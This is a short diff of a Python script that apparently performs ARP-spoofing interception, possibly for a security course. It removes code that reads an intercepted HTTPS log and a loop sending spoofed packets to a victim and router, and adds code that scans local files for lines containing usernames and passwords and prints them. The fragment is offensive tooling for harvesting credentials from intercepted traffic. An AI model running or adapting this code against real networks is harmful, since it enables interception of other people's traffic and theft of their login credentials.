@@ -171,10 +171,14 @@ if __name__ == "__main__":
 
     enable_port_forwarding()
 
-    f = open("logdir/*.140.113.41.24,443.log", "r")
-    print(f.read())
+    for file in os.listdir():
+        with open(file) as f:
+            for line in f:
+                if ('username=' in line) and ("password" in line):
+                    print("Find: ",line)
+                
 
-    while(1):
-        send(victimpacket)
-        send(routerpacket)    
-        sleep(2)
+    # while(1):
+    #     send(victimpacket)
+    #     send(routerpacket)    
+    #     sleep(2)
